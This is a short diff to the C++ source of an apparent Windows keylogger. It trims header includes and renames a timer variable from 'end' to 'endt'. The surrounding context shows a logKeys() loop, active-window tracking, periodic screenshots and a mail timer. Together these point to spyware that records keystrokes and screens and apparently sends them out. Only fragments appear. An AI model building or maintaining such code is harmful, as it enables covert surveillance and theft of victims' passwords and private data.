@@ -4,16 +4,10 @@
 #define _WIN32_WINNT 0x501
 
 #include<bits/stdc++.h>
-#include<stdio.h>
-#include<conio.h>
 #include<graphics.h>
 #include<windows.h>
-#include <windowsx.h>
 #include <ws2tcpip.h>
 #include <iphlpapi.h>
-#include <unistd.h>
-#include<winuser.h>
-#include<string>
 #include <winsock2.h>
 #include<time.h>
 #include <cstdlib>
@@ -30,7 +24,7 @@ using namespace std;
 
 bool numUnlocked = true;
 int capsCount=0,ssCount=4;
-time_t start, end;
+time_t start, endt;
 double elapsed, prev_elapsed = 0.0, mail_elapsed = 0.0;
 char last_window[256];
 
@@ -1500,9 +1494,9 @@ void logKeys()
     short i;
     while(1)
     {
-        time(&end);
+        time(&endt);
 
-        elapsed = difftime(end, start);
+        elapsed = difftime(endt, start);
         if (elapsed >= prev_elapsed+SSTIME)
         {
             char nameOfScreenshot[20];
